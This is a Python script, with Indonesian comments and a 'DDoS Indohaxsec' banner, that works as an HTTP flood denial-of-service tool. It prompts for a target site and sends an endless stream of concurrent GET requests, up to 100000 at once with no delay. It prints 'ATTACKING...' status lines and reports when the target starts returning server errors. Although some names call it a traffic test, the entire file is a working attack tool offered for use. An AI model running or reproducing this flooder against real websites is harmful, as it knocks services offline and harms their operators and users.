import aiohttp
import asyncio
import time

# Warna untuk output (lime, red, gold)
LIME = '\033[38;5;10m'
RED = '\033[38;5;9m'
GOLD = '\033[38;5;220m'
RESET = '\033[0m'  # Reset warna ke default

# ASCII Art
ascii_art = '''
╔═╗┬┌┬┐┌─┐═╗ ╦┌─┐┬  ┌─┐┬┌┬┐  ╔╦╗┌┬┐┌─┐┌─┐
╠╣ │ ││┌─┘╔╩╦╝├─┘│  │ ││ │    ║║ │││ │└─┐
╚  ┴─┴┘└─┘╩ ╚═┴  ┴─┘└─┘┴ ┴   ═╩╝─┴┘└─┘└─┘
╦╔╗╔╔╦╗╔═╗╦ ╦╔═╗═╗ ╦╔═╗╔═╗╔═╗            
║║║║ ║║║ ║╠═╣╠═╣╔╩╦╝╚═╗║╣ ║              
╩╝╚╝═╩╝╚═╝╩ ╩╩ ╩╩ ╚═╚═╝╚═╝╚═╝             
'''

# Menampilkan ASCII Art dengan warna gold
print(f"{GOLD}{ascii_art}{RESET}")

# Meminta input URL dari pengguna
url = input(f"{RED}MASUKAN SITUS TARGET: {RESET}")

# Menampilkan pesan setelah input URL
print(f"{RED}TARGET TERKUNCI MISIL DI LUNCURKAN!{RESET}")

# Fungsi untuk mengirim permintaan GET asinkron
async def kirim_permintaan(session, index, semaphore):
    async with semaphore:  # Menggunakan semaphore untuk membatasi koneksi yang bersamaan
        try:
            # Kirim permintaan tanpa delay untuk lebih cepat
            async with session.get(url) as response:
                # Menampilkan status dari situs target (misalnya: status code HTTP)
                if response.status != 200:
                    print(f"{RED}ATTACKING... Permintaan ke-{index+1} berhasil, tetapi situs merespons dengan status code {response.status} - {url}{RESET}")
                    if response.status == 503 or response.status >= 500:
                        print(f"{RED}Situs {url} tampaknya tidak merespons atau down (status: {response.status}){RESET}")
                else:
                    print(f"{LIME}ATTACKING... Permintaan ke-{index+1} berhasil, status code: {response.status} - {url}{RESET}")
        except asyncio.TimeoutError:
            # Menangani timeout jika server tidak merespons
            print(f"{RED}ATTACKING... Permintaan ke-{index+1} gagal: Timeout - Server tidak merespons{RESET}")
        except Exception as e:
            # Menangani kesalahan lain
            print(f"{RED}ATTACKING... Permintaan ke-{index+1} gagal: {e}{RESET}")

# Fungsi untuk menjalankan permintaan secara paralel dalam banyak thread (meningkatkan performa)
async def tes_traffic():
    semaphore = asyncio.Semaphore(100000)  # Maksimal 100000 koneksi bersamaan untuk lebih banyak permintaan
    async with aiohttp.ClientSession() as session:
        tasks = []
        count = 0
        while True:  # Proses akan terus berjalan hingga dihentikan secara manual
            count += 1
            task = asyncio.create_task(kirim_permintaan(session, count, semaphore))
            tasks.append(task)
            if count % 1000 == 0:  # Setiap 1000 permintaan, tampilkan pesan
                print(f"{LIME}ATTACKING... Total permintaan yang dikirim: {count}{RESET}")
            
            # Jangan menunggu, teruskan pengiriman permintaan tanpa delay
            await asyncio.sleep(0)  # Pastikan event loop tetap berjalan

        # Menjalankan tugas-tugas secara bersamaan (lebih banyak tasks per batch)
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    start_time = time.time()
    try:
        # Menjalankan event loop
        asyncio.run(tes_traffic())
    except Exception as e:
        print(f"Terjadi kesalahan saat menjalankan pengujian: {e}")
    end_time = time.time()
    # Menampilkan waktu total pengujian dengan warna lime
    print(f"{LIME}Pengujian selesai dalam waktu {end_time - start_time} detik.{RESET}")
